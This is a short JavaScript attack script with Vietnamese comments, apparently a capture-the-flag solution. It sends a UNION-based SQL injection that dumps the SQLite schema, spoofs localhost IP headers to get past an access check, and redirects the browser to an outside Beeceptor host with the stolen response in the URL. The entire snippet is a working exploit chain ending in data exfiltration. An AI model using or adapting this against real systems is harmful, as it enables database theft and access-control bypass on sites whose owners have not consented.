let formData = new URLSearchParams();

// Dùng AS resolve để "ngụy trang" dữ liệu của chúng ta thành cột hợp lệ
formData.append('id', '-1 UNION SELECT GROUP_CONCAT(sql) AS resolve FROM sqlite_master');

fetch('/check-resolve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1'
    },
    body: formData.toString()
})
.then(response => response.text())
.then(data => {
    // Bế data trả về thẳng Beeceptor
    window.location = 'https://khanh.free.beeceptor.com/?flag=' + encodeURIComponent(data);
});